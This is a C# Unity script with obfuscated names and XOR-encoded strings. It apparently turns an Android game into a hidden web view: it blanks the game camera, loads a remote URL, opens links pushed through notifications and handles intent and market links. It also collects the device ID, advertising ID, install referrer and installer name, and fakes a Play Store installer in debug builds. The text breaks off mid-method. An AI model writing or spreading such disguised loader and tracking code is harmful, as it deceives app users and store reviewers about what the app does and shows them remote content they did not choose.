using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0x7dc557d6 : MonoBehaviour
{
    private void _0x30fcf0d6(string _0x7b5f531a)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[34] { 253, 242, 195, 213, 210, 251, 134, 224, 195, 210, 197, 206, 134, 227, 222, 210, 212, 199, 134, 246, 211, 213, 206, 134, 226, 199, 210, 199, 134, 244, 199, 209, 156, 134 }, 166) + _0x7b5f531a);
#endif
            }
        }

        var _0x32515366 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x7b5f531a);
        StartCoroutine(_0x1ba6bb7e(_0x32515366));
    }

    private IEnumerator _0x84844228(string _0x24e86345)
    {
        if (_0x8b5683d0 != null && _0xad6479a6)
            yield break;
        _0x8b5683d0 = gameObject.AddComponent<UniWebView>();
        _0xebf61ed4(_0x8b5683d0);
        _0x1305527d(_0x8b5683d0);
        _0x8b5683d0.BackgroundColor = Color.clear;
        var _0xfaa63e3d = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0xd9c381a4();
        yield return new WaitForEndOfFrame();
        _0xad6479a6 = true;
        _0x02d28fad();
        _0xff0c8cab(true);
        _0x9f636f33 = false;
        _0x5b7f34c9 = false;
        _0x0a749e0b.Clear();
        _0x30353436 = -1;
        firstLoadShown = false;
        _0xcc2a273b = false;
        _0xe51c0a8a = false;
        _0x8b5683d0.SetUserAgent("");
        _0xfd278a27 = Time.realtimeSinceStartup;
        _0x8b5683d0.Stop();
        _0x8b5683d0.Load(_0x24e86345);
        _0x8b5683d0.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x6938ded6._0xbdc404bd(new byte[25] { 173, 129, 137, 142, 192, 183, 133, 130, 182, 137, 133, 151, 192, 169, 142, 137, 148, 137, 129, 140, 192, 179, 136, 143, 151 }, 224));
    }

    private void _0xb7421593(string _0xc32fcd67)
    {
        Dictionary<string, object> _0x1bab8d17;
        try
        {
            _0x1bab8d17 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xc32fcd67);
        }
        catch
        {
            return;
        }

        var _0x8e362f9b = ReadPushField(_0x1bab8d17, _0x6938ded6._0xbdc404bd(new byte[3] { 232, 239, 241 }, 157));
        if (string.IsNullOrWhiteSpace(_0x8e362f9b))
            return;
        _0x8e362f9b = _0x8e362f9b.Trim();
        if (!IsHttpUrl(_0x8e362f9b))
            return;
        if (string.Equals(_0x8e362f9b, _0xf789141d, StringComparison.Ordinal))
            return;
        _0xf789141d = _0x8e362f9b;
        OpenUrlExternally(_0x8e362f9b);
    }

    // WEB VIEW LOGIC END
    internal void _0x960b2809()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x8d161f69 = new AndroidNotificationChannel
        {
            Id = _0x6938ded6._0xbdc404bd(new byte[15] { 146, 147, 144, 151, 131, 154, 130, 169, 149, 158, 151, 152, 152, 147, 154 }, 246),
            Name = _0x6938ded6._0xbdc404bd(new byte[15] { 164, 133, 134, 129, 149, 140, 148, 192, 163, 136, 129, 142, 142, 133, 140 }, 224),
            Importance = Importance.High,
            Description = _0x6938ded6._0xbdc404bd(new byte[21] { 119, 85, 94, 85, 66, 81, 92, 16, 94, 95, 68, 89, 86, 89, 83, 81, 68, 89, 95, 94, 67 }, 48)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x8d161f69);
        // Build notification
        var _0xdcc8d335 = new AndroidNotification
        {
            Title = _0xbb0b0537[UnityEngine.Random.Range(0, _0xbb0b0537.Length)],
            Text = _0x6938ded6._0xbdc404bd(new byte[21] { 216, 235, 252, 185, 224, 246, 236, 185, 234, 236, 235, 252, 185, 237, 246, 185, 252, 225, 240, 237, 166 }, 153),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0xdcc8d335, _0x6938ded6._0xbdc404bd(new byte[15] { 156, 157, 158, 153, 141, 148, 140, 167, 155, 144, 153, 150, 150, 157, 148 }, 248));
    }

    internal bool IsAboutBlank(string _0x8746379f)
    {
        if (string.IsNullOrEmpty(_0x8746379f))
            return false;
        return _0x8746379f.StartsWith(_0x6938ded6._0xbdc404bd(new byte[11] { 28, 31, 18, 8, 9, 71, 31, 17, 28, 19, 22 }, 125), StringComparison.OrdinalIgnoreCase);
    }

    internal bool _0x7c695026(string _0xa0e02057)
    {
        return _0xa0e02057.StartsWith(_0x6938ded6._0xbdc404bd(new byte[9] { 199, 203, 216, 193, 207, 222, 144, 133, 133 }, 170), StringComparison.OrdinalIgnoreCase) || _0xa0e02057.StartsWith(_0x6938ded6._0xbdc404bd(new byte[24] { 105, 117, 117, 113, 114, 59, 46, 46, 113, 109, 96, 120, 47, 102, 110, 110, 102, 109, 100, 47, 98, 110, 108, 46 }, 1), StringComparison.OrdinalIgnoreCase) || _0xa0e02057.StartsWith(_0x6938ded6._0xbdc404bd(new byte[23] { 0, 28, 28, 24, 82, 71, 71, 24, 4, 9, 17, 70, 15, 7, 7, 15, 4, 13, 70, 11, 7, 5, 71 }, 104), StringComparison.OrdinalIgnoreCase);
    }

    // WS_SOURCE MONO
    public static _0x7dc557d6 _0x562e499c { get; private set; }

    internal Rect lastSafe = Rect.zero;
    internal bool IsGoogleAuthFlowUrl(string _0x48ee3bdc)
    {
        if (string.IsNullOrEmpty(_0x48ee3bdc))
            return false;
        return _0x48ee3bdc.IndexOf(_0x6938ded6._0xbdc404bd(new byte[19] { 27, 25, 25, 21, 15, 20, 14, 9, 84, 29, 21, 21, 29, 22, 31, 84, 25, 21, 23 }, 122), StringComparison.OrdinalIgnoreCase) >= 0 || _0x48ee3bdc.IndexOf(_0x6938ded6._0xbdc404bd(new byte[16] { 32, 34, 34, 46, 52, 47, 53, 50, 111, 38, 46, 46, 38, 45, 36, 111 }, 65), StringComparison.OrdinalIgnoreCase) >= 0 || _0x48ee3bdc.IndexOf(_0x6938ded6._0xbdc404bd(new byte[21] { 182, 190, 190, 182, 189, 180, 164, 162, 180, 163, 178, 190, 191, 165, 180, 191, 165, 255, 178, 190, 188 }, 209), StringComparison.OrdinalIgnoreCase) >= 0 || _0x48ee3bdc.IndexOf(_0x6938ded6._0xbdc404bd(new byte[11] { 81, 69, 66, 87, 66, 95, 85, 24, 85, 89, 91 }, 54), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private Task _0x623d800f(IEnumerator _0x3160ac19)
    {
        var _0xbbb82732 = new TaskCompletionSource<bool>();
        StartCoroutine(_0xd661dd30(_0x3160ac19, _0xbbb82732));
        return _0xbbb82732.Task;
    }

    private string _0xf4796fa5(string _0x29613144, string _0xb3a932d9)
    {
        if (string.IsNullOrEmpty(_0xb3a932d9))
            return _0x29613144;
        if (_0x29613144.Contains(_0x6938ded6._0xbdc404bd(new byte[1] { 199 }, 248)))
            return _0x29613144 + _0x6938ded6._0xbdc404bd(new byte[8] { 74, 31, 9, 2, 8, 5, 8, 81 }, 108) + UnityWebRequest.EscapeURL(_0xb3a932d9);
        else
            return _0x29613144 + _0x6938ded6._0xbdc404bd(new byte[8] { 54, 122, 108, 103, 109, 96, 109, 52 }, 9) + UnityWebRequest.EscapeURL(_0xb3a932d9);
    }

    private void _0x6953bc5a(string _0xe1d33a39)
    {
        bool _0x30760962 = !string.IsNullOrEmpty(_0xe1d33a39);
        if (_0x30760962)
        {
            {
#if B_LOGS
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[13] { 101, 106, 91, 77, 74, 99, 30, 109, 86, 81, 73, 4, 30 }, 62) + _0xe1d33a39);
#endif
            }

            _0xb916ebe7(_0xe1d33a39);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[39] { 208, 223, 238, 248, 255, 214, 171, 205, 234, 231, 231, 233, 234, 232, 224, 171, 105, 13, 25, 171, 204, 234, 230, 238, 171, 163, 229, 228, 171, 237, 226, 229, 234, 231, 171, 222, 217, 199, 162 }, 139));
#endif
            }

            _0x816ea96e();
            return;
        }
    }

    private bool _0x9f636f33 = false;
    private void _0xebf61ed4(UniWebView _0xa7c14dc4)
    {
        _0xa7c14dc4.BackgroundColor = Color.clear;
        _0xa7c14dc4.SetSupportMultipleWindows(true, true);
        _0xa7c14dc4.SetBackButtonEnabled(false);
        _0x8b5683d0.SetUserAgent(_0xf5082241());
    }

    private string _0xaf1051ad = "";
    private bool _0xb95de315()
    {
        var _0x070649b2 = Keyboard.current;
        return _0x070649b2 != null && _0x070649b2.escapeKey.wasPressedThisFrame;
    }

    private string _0xeba73b7d = "";
    private void _0xa3cbcc5a()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private string _0xedebd1d4 = "";
    private bool _0x5cdb22a2(string _0x0ec8e462)
    {
        try
        {
            using (var _0x0681430a = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[30] { 49, 61, 63, 124, 39, 60, 59, 38, 43, 97, 54, 124, 34, 62, 51, 43, 55, 32, 124, 7, 60, 59, 38, 43, 2, 62, 51, 43, 55, 32 }, 82)))
            using (var _0x5105938f = _0x0681430a.GetStatic<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[15] { 90, 76, 75, 75, 92, 87, 77, 120, 90, 77, 80, 79, 80, 77, 64 }, 57)))
            using (var _0x50c970f7 = _0x5105938f.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[17] { 114, 112, 97, 69, 116, 118, 126, 116, 114, 112, 88, 116, 123, 116, 114, 112, 103 }, 21)))
            using (var _0x1bf623e5 = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[22] { 28, 19, 25, 15, 18, 20, 25, 83, 30, 18, 19, 9, 24, 19, 9, 83, 52, 19, 9, 24, 19, 9 }, 125)))
            using (var _0xec74f72c = _0x1bf623e5.CallStatic<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[8] { 164, 181, 166, 167, 177, 129, 166, 189 }, 212), _0x0ec8e462, 1))
            {
                string _0x5dfbbf26 = _0xec74f72c.Call<string>(_0x6938ded6._0xbdc404bd(new byte[14] { 42, 40, 57, 30, 57, 63, 36, 35, 42, 8, 53, 57, 63, 44 }, 77), _0x6938ded6._0xbdc404bd(new byte[20] { 41, 57, 36, 60, 56, 46, 57, 20, 45, 42, 39, 39, 41, 42, 40, 32, 20, 62, 57, 39 }, 75));
                string _0xf6c62659 = _0xec74f72c.Call<string>(_0x6938ded6._0xbdc404bd(new byte[10] { 249, 251, 234, 206, 255, 253, 245, 255, 249, 251 }, 158));
                _0xec74f72c.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[11] { 91, 94, 94, 121, 91, 78, 95, 93, 85, 72, 67 }, 58), _0x6938ded6._0xbdc404bd(new byte[33] { 57, 54, 60, 42, 55, 49, 60, 118, 49, 54, 44, 61, 54, 44, 118, 59, 57, 44, 61, 63, 55, 42, 33, 118, 26, 10, 23, 15, 11, 25, 26, 20, 29 }, 88));
                _0xec74f72c.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[11] { 218, 205, 197, 199, 222, 205, 237, 208, 220, 218, 201 }, 168), _0x6938ded6._0xbdc404bd(new byte[20] { 116, 100, 121, 97, 101, 115, 100, 73, 112, 119, 122, 122, 116, 119, 117, 125, 73, 99, 100, 122 }, 22));
                if (_0xec74f72c.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[15] { 61, 42, 60, 32, 35, 57, 42, 14, 44, 59, 38, 57, 38, 59, 54 }, 79), _0x50c970f7) != null)
                {
                    WLog(_0x6938ded6._0xbdc404bd(new byte[24] { 209, 250, 224, 253, 255, 247, 222, 251, 249, 247, 178, 253, 226, 247, 252, 178, 251, 252, 230, 247, 252, 230, 168, 178 }, 146) + _0x0ec8e462);
                    _0xec74f72c.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[8] { 199, 194, 194, 224, 202, 199, 193, 213 }, 166), 0x10000000);
                    _0x5105938f.Call(_0x6938ded6._0xbdc404bd(new byte[13] { 26, 29, 8, 27, 29, 40, 10, 29, 0, 31, 0, 29, 16 }, 105), _0xec74f72c);
                    return true;
                }

                if (_0x6e8074aa(_0xf6c62659))
                    return true;
                if (!string.IsNullOrEmpty(_0x5dfbbf26))
                {
                    WLog(_0x6938ded6._0xbdc404bd(new byte[28] { 234, 193, 219, 198, 196, 204, 229, 192, 194, 204, 137, 192, 199, 221, 204, 199, 221, 137, 207, 200, 197, 197, 203, 200, 202, 194, 147, 137 }, 169) + _0x5dfbbf26);
                    if (_0x7c695026(_0x5dfbbf26))
                        return _0x1a92e41c(_0x5dfbbf26, _0xf6c62659);
                    return _0x99999d7a(_0x5dfbbf26);
                }

                WLog(_0x6938ded6._0xbdc404bd(new byte[30] { 164, 143, 149, 136, 138, 130, 171, 142, 140, 130, 199, 142, 137, 147, 130, 137, 147, 199, 137, 136, 199, 143, 134, 137, 131, 139, 130, 149, 221, 199 }, 231) + _0x0ec8e462);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x6938ded6._0xbdc404bd(new byte[26] { 218, 241, 235, 246, 244, 252, 213, 240, 242, 252, 185, 240, 247, 237, 252, 247, 237, 185, 255, 248, 240, 245, 252, 253, 163, 185 }, 153) + e.Message);
            return true;
        }
    }

    private Canvas _0x4de303c9()
    {
        if (_0x420d8de4 != null)
            return _0x420d8de4;
        var _0x0d6d9e8b = gameObject.GetComponentInChildren<Canvas>();
        if (_0x0d6d9e8b == null)
        {
            var _0x6d4b9329 = new GameObject(_0x6938ded6._0xbdc404bd(new byte[6] { 39, 5, 10, 18, 5, 23 }, 100), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x0d6d9e8b = _0x6d4b9329.GetComponent<Canvas>();
            _0x0d6d9e8b.transform.SetParent(transform, false);
            _0x0d6d9e8b.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x420d8de4 = _0x0d6d9e8b;
        return _0x420d8de4;
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0x8b5683d0 = null;
    private void _0x379fa048()
    {
        {
#if B_LOGS
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[22] { 248, 247, 198, 208, 215, 254, 131, 240, 215, 204, 209, 198, 231, 198, 213, 202, 192, 198, 234, 205, 197, 204 }, 163));
#endif
        }

        _0x6f497917 = SystemInfo.deviceModel;
        _0x2571d61a = Application.version;
        _0x44ce2c12 = Application.installMode;
        _0xeba73b7d = Application.installerName;
        _0xfcc68d7f = Application.identifier;
        _0x7d45dc73 = _0x3df961de();
        _0x4c49f262 = _0x8209008f();
        _0x504046eb = SystemInfo.deviceUniqueIdentifier;
        _0x932c2ce6 = SystemInfo.graphicsDeviceName;
        _0x5fbdd8dd = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x2571d61a = _0x6938ded6._0xbdc404bd(new byte[5] { 70, 95, 70, 95, 70 }, 113);
                _0x44ce2c12 = ApplicationInstallMode.Store;
                _0xeba73b7d = _0x6938ded6._0xbdc404bd(new byte[19] { 251, 247, 245, 182, 249, 246, 252, 234, 247, 241, 252, 182, 238, 253, 246, 252, 241, 246, 255 }, 152);
                _0x4c49f262 = _0x6938ded6._0xbdc404bd(new byte[8] { 84, 92, 65, 69, 72, 17, 68, 80 }, 49);
                _0x504046eb = Guid.NewGuid().ToString().Replace(_0x6938ded6._0xbdc404bd(new byte[1] { 241 }, 220), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[17] { 20, 27, 42, 60, 59, 18, 111, 43, 42, 57, 2, 32, 43, 42, 35, 117, 111 }, 79) + _0x6f497917);
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[19] { 128, 143, 190, 168, 175, 134, 251, 186, 171, 171, 141, 190, 169, 168, 178, 180, 181, 225, 251 }, 219) + _0x2571d61a);
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[20] { 38, 41, 24, 14, 9, 32, 93, 20, 19, 14, 9, 28, 17, 17, 48, 18, 25, 24, 71, 93 }, 125) + _0x44ce2c12);
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[23] { 182, 185, 136, 158, 153, 176, 205, 132, 131, 158, 153, 140, 129, 129, 136, 159, 190, 153, 130, 159, 136, 215, 205 }, 237) + _0xeba73b7d);
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[14] { 242, 253, 204, 218, 221, 244, 137, 200, 217, 217, 224, 205, 147, 137 }, 169) + _0xfcc68d7f);
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[14] { 175, 160, 145, 135, 128, 169, 212, 149, 144, 130, 189, 144, 206, 212 }, 244) + _0x7d45dc73);
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[18] { 199, 200, 249, 239, 232, 193, 188, 233, 239, 249, 238, 221, 251, 249, 242, 232, 166, 188 }, 156) + _0x4c49f262);
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[17] { 137, 134, 183, 161, 166, 143, 242, 161, 171, 161, 150, 183, 164, 155, 182, 232, 242 }, 210) + _0x504046eb);
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[12] { 225, 238, 223, 201, 206, 231, 154, 221, 202, 207, 128, 154 }, 186) + _0x932c2ce6);
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[12] { 14, 1, 48, 38, 33, 8, 117, 54, 37, 32, 111, 117 }, 85) + _0x5fbdd8dd);
#endif
        }
    }

    private void _0x5e0fef1c()
    {
        _0x5b7f34c9 = true;
        if (_0x8b5683d0 != null)
            _0x8b5683d0.SetUserAgent(_0xf5082241());
    }

    private bool _0xe51c0a8a = false;
    private void _0xff0c8cab(bool _0x52fb8a0e)
    {
        _0x02d28fad();
        _0xa66599db.SetActive(_0x52fb8a0e);
        _0x3eaadd85 = _0x52fb8a0e;
        if (_0x52fb8a0e)
        {
            _0xa66599db.transform.SetAsLastSibling();
            if (_0x45a777cf != null)
                _0x45a777cf.localRotation = Quaternion.identity;
        }
    }

    internal bool isApplicationFocus = false;
    private string _0x26a71097 = "";
    private bool _0xc384fffc = false;
    private RectTransform _0x45a777cf;
    private static string ReadPushField(Dictionary<string, object> _0x998f24d9, string _0x0228074b)
    {
        if (_0x998f24d9 == null || string.IsNullOrEmpty(_0x0228074b))
            return string.Empty;
        if (_0x998f24d9.TryGetValue(_0x6938ded6._0xbdc404bd(new byte[16] { 201, 200, 211, 206, 193, 206, 196, 198, 211, 206, 200, 201, 227, 198, 211, 198 }, 167), out var raw))
        {
            try
            {
                var _0xbb3fdc27 = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0xbb3fdc27 != null && _0xbb3fdc27.TryGetValue(_0x0228074b, out var nestedVal))
                {
                    var _0xf63ebcb7 = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0xf63ebcb7))
                        return _0xf63ebcb7;
                }
            }
            catch
            {
            }
        }

        if (_0x998f24d9.TryGetValue(_0x0228074b, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private string _0x6f497917 = "";
    private int _0x82ea3f6c = 5, _0x017aab63 = 5, _0xa2156a69 = 5, _0x23cc6156 = 5;
    private string _0x7d45dc73 = "";
    private string _0x9429181c = "";
    private string _0xdb81eae3()
    {
        string _0xac6a0001 = _0xf5082241();
        if (string.IsNullOrEmpty(_0xac6a0001))
            return _0x6938ded6._0xbdc404bd(new byte[7] { 254, 231, 225, 236, 168, 184, 179 }, 136);
        string _0x43e769ea = _0xac6a0001.Replace(_0x6938ded6._0xbdc404bd(new byte[1] { 38 }, 122), _0x6938ded6._0xbdc404bd(new byte[2] { 80, 80 }, 12)).Replace(_0x6938ded6._0xbdc404bd(new byte[1] { 198 }, 225), _0x6938ded6._0xbdc404bd(new byte[2] { 18, 105 }, 78));
        var _0xbf99040f = Regex.Match(_0xac6a0001, _0x6938ded6._0xbdc404bd(new byte[12] { 25, 50, 40, 53, 55, 63, 117, 114, 6, 62, 113, 115 }, 90));
        string _0xda86c3d5 = _0xbf99040f.Success ? _0xbf99040f.Groups[1].Value : _0x6938ded6._0xbdc404bd(new byte[3] { 117, 118, 116 }, 68);
        return _0x6938ded6._0xbdc404bd(new byte[12] { 122, 52, 39, 60, 49, 38, 59, 61, 60, 122, 123, 41 }, 82) + _0x6938ded6._0xbdc404bd(new byte[8] { 46, 57, 42, 120, 45, 57, 101, 127 }, 88) + _0x43e769ea + _0x6938ded6._0xbdc404bd(new byte[2] { 117, 105 }, 82) + _0x6938ded6._0xbdc404bd(new byte[30] { 93, 74, 89, 11, 91, 89, 68, 95, 68, 22, 101, 74, 93, 66, 76, 74, 95, 68, 89, 5, 91, 89, 68, 95, 68, 95, 82, 91, 78, 16 }, 43) + _0x6938ded6._0xbdc404bd(new byte[121] { 200, 219, 192, 205, 218, 199, 193, 192, 142, 202, 203, 200, 134, 193, 204, 196, 130, 197, 203, 215, 130, 216, 207, 194, 135, 213, 218, 220, 215, 213, 225, 204, 196, 203, 205, 218, 128, 202, 203, 200, 199, 192, 203, 254, 220, 193, 222, 203, 220, 218, 215, 134, 193, 204, 196, 130, 197, 203, 215, 130, 213, 201, 203, 218, 148, 200, 219, 192, 205, 218, 199, 193, 192, 134, 135, 213, 220, 203, 218, 219, 220, 192, 142, 216, 207, 194, 149, 211, 130, 205, 193, 192, 200, 199, 201, 219, 220, 207, 204, 194, 203, 148, 218, 220, 219, 203, 211, 135, 149, 211, 205, 207, 218, 205, 198, 134, 203, 135, 213, 211, 211 }, 174) + _0x6938ded6._0xbdc404bd(new byte[26] { 72, 73, 74, 4, 92, 94, 67, 88, 67, 0, 11, 89, 95, 73, 94, 109, 75, 73, 66, 88, 11, 0, 89, 77, 5, 23 }, 44) + _0x6938ded6._0xbdc404bd(new byte[52] { 175, 174, 173, 227, 187, 185, 164, 191, 164, 231, 236, 170, 187, 187, 157, 174, 185, 184, 162, 164, 165, 236, 231, 190, 170, 229, 185, 174, 187, 167, 170, 168, 174, 227, 228, 149, 134, 164, 177, 162, 167, 167, 170, 151, 228, 228, 231, 236, 236, 226, 226, 240 }, 203) + _0x6938ded6._0xbdc404bd(new byte[37] { 43, 42, 41, 103, 63, 61, 32, 59, 32, 99, 104, 63, 35, 46, 59, 41, 32, 61, 34, 104, 99, 104, 3, 38, 33, 58, 55, 111, 46, 61, 34, 57, 119, 35, 104, 102, 116 }, 79) + _0x6938ded6._0xbdc404bd(new byte[34] { 224, 225, 226, 172, 244, 246, 235, 240, 235, 168, 163, 242, 225, 234, 224, 235, 246, 163, 168, 163, 195, 235, 235, 227, 232, 225, 164, 205, 234, 231, 170, 163, 173, 191 }, 132) + _0x6938ded6._0xbdc404bd(new byte[30] { 11, 10, 9, 71, 31, 29, 0, 27, 0, 67, 72, 2, 14, 23, 59, 0, 26, 12, 7, 63, 0, 6, 1, 27, 28, 72, 67, 90, 70, 84 }, 111) + _0x6938ded6._0xbdc404bd(new byte[48] { 173, 171, 160, 162, 175, 184, 171, 249, 172, 184, 189, 228, 162, 187, 171, 184, 183, 189, 170, 227, 130, 162, 187, 171, 184, 183, 189, 227, 254, 154, 177, 171, 182, 180, 176, 172, 180, 254, 245, 175, 188, 171, 170, 176, 182, 183, 227, 254 }, 217) + _0xda86c3d5 + _0x6938ded6._0xbdc404bd(new byte[35] { 192, 154, 203, 156, 133, 149, 134, 137, 131, 221, 192, 160, 136, 136, 128, 139, 130, 199, 164, 143, 149, 136, 138, 130, 192, 203, 145, 130, 149, 148, 142, 136, 137, 221, 192 }, 231) + _0xda86c3d5 + _0x6938ded6._0xbdc404bd(new byte[238] { 248, 162, 243, 164, 189, 173, 190, 177, 187, 229, 248, 145, 176, 171, 226, 158, 224, 157, 173, 190, 177, 187, 248, 243, 169, 186, 173, 172, 182, 176, 177, 229, 248, 237, 235, 248, 162, 130, 243, 178, 176, 189, 182, 179, 186, 229, 171, 173, 170, 186, 243, 175, 179, 190, 171, 185, 176, 173, 178, 229, 248, 158, 177, 187, 173, 176, 182, 187, 248, 243, 184, 186, 171, 151, 182, 184, 183, 154, 177, 171, 173, 176, 175, 166, 137, 190, 179, 170, 186, 172, 229, 185, 170, 177, 188, 171, 182, 176, 177, 247, 246, 164, 173, 186, 171, 170, 173, 177, 255, 143, 173, 176, 178, 182, 172, 186, 241, 173, 186, 172, 176, 179, 169, 186, 247, 164, 190, 173, 188, 183, 182, 171, 186, 188, 171, 170, 173, 186, 229, 248, 190, 173, 178, 248, 243, 189, 182, 171, 177, 186, 172, 172, 229, 248, 233, 235, 248, 243, 178, 176, 189, 182, 179, 186, 229, 171, 173, 170, 186, 243, 178, 176, 187, 186, 179, 229, 248, 248, 243, 175, 179, 190, 171, 185, 176, 173, 178, 229, 248, 158, 177, 187, 173, 176, 182, 187, 248, 243, 175, 179, 190, 171, 185, 176, 173, 178, 137, 186, 173, 172, 182, 176, 177, 229, 248, 238, 235, 241, 239, 241, 239, 248, 243, 170, 190, 153, 170, 179, 179, 137, 186, 173, 172, 182, 176, 177, 229, 248 }, 223) + _0xda86c3d5 + _0x6938ded6._0xbdc404bd(new byte[117] { 177, 175, 177, 175, 177, 175, 184, 226, 182, 164, 226, 226, 164, 208, 253, 245, 250, 252, 235, 177, 251, 250, 249, 246, 241, 250, 207, 237, 240, 239, 250, 237, 235, 230, 183, 239, 237, 240, 235, 240, 179, 184, 234, 236, 250, 237, 222, 248, 250, 241, 235, 219, 254, 235, 254, 184, 179, 228, 248, 250, 235, 165, 249, 234, 241, 252, 235, 246, 240, 241, 183, 182, 228, 237, 250, 235, 234, 237, 241, 191, 234, 254, 251, 164, 226, 179, 252, 240, 241, 249, 246, 248, 234, 237, 254, 253, 243, 250, 165, 235, 237, 234, 250, 226, 182, 164, 226, 252, 254, 235, 252, 247, 183, 250, 182, 228, 226 }, 159) + _0x6938ded6._0xbdc404bd(new byte[5] { 159, 203, 202, 203, 217 }, 226);
    }

    private bool TryOpenExternalLikeChrome(string _0x0a3af005)
    {
        if (string.IsNullOrEmpty(_0x0a3af005))
            return false;
        if (_0x0a3af005.StartsWith(_0x6938ded6._0xbdc404bd(new byte[9] { 201, 206, 212, 197, 206, 212, 154, 143, 143 }, 160), StringComparison.OrdinalIgnoreCase))
            return _0x5cdb22a2(_0x0a3af005);
        if (_0x7c695026(_0x0a3af005))
            return _0x1a92e41c(_0x0a3af005, null);
        if (!_0x0a3af005.StartsWith(_0x6938ded6._0xbdc404bd(new byte[7] { 238, 242, 242, 246, 188, 169, 169 }, 134), StringComparison.OrdinalIgnoreCase) && !_0x0a3af005.StartsWith(_0x6938ded6._0xbdc404bd(new byte[8] { 25, 5, 5, 1, 2, 75, 94, 94 }, 113), StringComparison.OrdinalIgnoreCase) && !_0x0a3af005.StartsWith(_0x6938ded6._0xbdc404bd(new byte[11] { 173, 174, 163, 185, 184, 246, 174, 160, 173, 162, 167 }, 204), StringComparison.OrdinalIgnoreCase))
        {
            return _0x99999d7a(_0x0a3af005);
        }

        return false;
    }

    private string _0xf789141d;
    private string _0x8209008f()
    {
        try
        {
            using (var _0xff5fceb8 = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[30] { 211, 223, 221, 158, 197, 222, 217, 196, 201, 131, 212, 158, 192, 220, 209, 201, 213, 194, 158, 229, 222, 217, 196, 201, 224, 220, 209, 201, 213, 194 }, 176)))
            {
                var _0x28fe3f72 = _0xff5fceb8.GetStatic<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[15] { 236, 250, 253, 253, 234, 225, 251, 206, 236, 251, 230, 249, 230, 251, 246 }, 143));
                var _0xe13214d9 = _0x28fe3f72.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[21] { 5, 7, 22, 35, 18, 18, 14, 11, 1, 3, 22, 11, 13, 12, 33, 13, 12, 22, 7, 26, 22 }, 98));
                using (var _0x0fe36f3d = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[26] { 108, 99, 105, 127, 98, 100, 105, 35, 122, 104, 111, 102, 100, 121, 35, 90, 104, 111, 94, 104, 121, 121, 100, 99, 106, 126 }, 13)))
                {
                    return _0x0fe36f3d.CallStatic<string>(_0x6938ded6._0xbdc404bd(new byte[19] { 36, 38, 55, 7, 38, 37, 34, 54, 47, 55, 22, 48, 38, 49, 2, 36, 38, 45, 55 }, 67), _0xe13214d9);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private AndroidJavaObject _0x366a59af { get; set; }

    private Action _0xb30e3870;
    private string _0x504046eb = "";
    private bool _0x25b95b17()
    {
        var _0x11227156 = _0xcb60871a();
        if (_0x11227156 == null)
            return false;
